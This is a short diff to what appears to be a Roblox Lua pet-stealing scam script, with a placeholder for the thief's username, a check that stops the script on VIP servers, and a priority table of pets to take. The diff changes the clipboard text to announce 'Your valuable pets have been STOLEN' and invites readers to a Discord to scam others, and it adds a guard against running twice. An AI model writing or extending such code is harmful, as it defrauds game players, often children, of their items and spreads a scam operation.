@@ -31,7 +31,7 @@ getgenv().Username = "PUT_HERE_UR_USERNAME"
         local attempt = 1
         local teleported = false
 
-        setclipboard("discord.gg/d2zgg2YDMz")
+        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -74,6 +74,13 @@ getgenv().Username = "PUT_HERE_UR_USERNAME"
         if GetServerType:InvokeServer() == "VIPServer" then
             error("Script stopped - VIP Server detected")        
         end
+
+if getgenv().LilFeatherRunning then
+    warn("Wait lil bro")
+    return
+end
+getgenv().LilFeatherRunning = true
+
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
